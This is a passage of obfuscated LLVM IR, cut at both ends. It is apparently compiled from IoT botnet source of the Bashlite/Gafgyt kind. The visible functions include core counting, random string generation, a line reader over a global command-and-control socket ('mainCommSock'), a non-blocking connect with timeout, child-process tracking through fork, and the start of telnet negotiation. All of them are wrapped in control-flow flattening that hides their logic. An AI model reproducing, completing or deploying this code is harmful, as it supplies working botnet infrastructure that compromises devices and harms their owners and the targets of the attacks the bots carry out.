  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 760075722, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 -1278640748, i32 1365683153
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 1066868779, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 -792561189, i32 -1372087499
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 -1372087499, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #2
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 733934330, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 865265828, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 733934330, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 -737844851, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -737844851, label %5
    i32 165649853, label %11
    i32 1277281280, label %18
    i32 1639847739, label %21
    i32 1622909358, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 165649853, i32 1622909358
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 1277281280, i32 1639847739
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 1639847739, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 -737844851, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1325071263, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1325071263, label %6
    i32 -833930021, label %11
    i32 -1887070608, label %20
    i32 -833628516, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -833930021, i32 -833628516
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1887070608, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1325071263, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -1411211462, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1411211462, label %24
    i32 -1418470390, label %33
    i32 -867433686, label %50
    i32 -1100388078, label %51
    i32 2128875167, label %55
    i32 -1860433292, label %60
    i32 511712888, label %69
    i32 1621979362, label %86
    i32 -1417746957, label %89
    i32 1055081818, label %90
    i32 1943223000, label %91
    i32 567200023, label %93
    i32 1448021461, label %98
    i32 -1197816410, label %103
    i32 -405664133, label %105
    i32 937111553, label %113
    i32 -1531134322, label %114
    i32 -290476147, label %117
    i32 -996310147, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -1418470390, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -867433686, i32 1943223000
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -1100388078, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 2128875167, i32 1055081818
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -1860433292, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 511712888, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 1621979362, i32 -1417746957
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 -1100388078, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1055081818, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 1943223000, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 567200023, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 1448021461, i32 -290476147
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 -1197816410, i32 -405664133
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 -996310147, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 937111553, i32 -1531134322
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 -290476147, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 567200023, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 -996310147, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 877729866, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 877729866, label %first
    i32 -790970766, label %37
    i32 216113543, label %38
    i32 1054223190, label %47
    i32 245023764, label %52
    i32 1852727396, label %57
    i32 -8001577, label %66
    i32 1826145714, label %83
    i32 -1829153026, label %90
    i32 -1516112155, label %91
    i32 599924125, label %92
    i32 -1818104865, label %93
    i32 -1474174848, label %94
    i32 -1122694500, label %95
    i32 -908294782, label %96
    i32 -612062118, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -790970766, i32 216113543
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -612062118, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 1054223190, i32 -908294782
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 245023764, i32 -1474174848
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 1852727396, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -8001577, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 1826145714, i32 599924125
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -1829153026, i32 -1516112155
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -612062118, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -1818104865, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -612062118, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1122694500, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -612062118, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -908294782, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -612062118, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -733729150, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -733729150, label %first
    i32 100137454, label %9
    i32 1645081279, label %11
    i32 834542014, label %19
    i32 2114003771, label %26
    i32 2075272148, label %36
    i32 1092958569, label %39
    i32 -1831554781, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 100137454, i32 1645081279
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1831554781, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 834542014, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 2114003771, i32 1092958569
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 2075272148, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 834542014, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -1831554781, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 686385021, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 686385021, label %NodeBlock
    i32 -992978963, label %LeafBlock1
    i32 -86616802, label %LeafBlock
    i32 -2113958538, label %16
    i32 864886070, label %17
    i32 81573064, label %26
    i32 168570176, label %27
    i32 1833333724, label %34
    i32 1389530174, label %35
    i32 -1542379976, label %42
    i32 -99131853, label %50
    i32 1915717334, label %58
    i32 -1442923658, label %59
    i32 -913667696, label %60
    i32 337817518, label %NewDefault
    i32 1332218702, label %67
    i32 -1285903027, label %68
    i32 -906983317, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
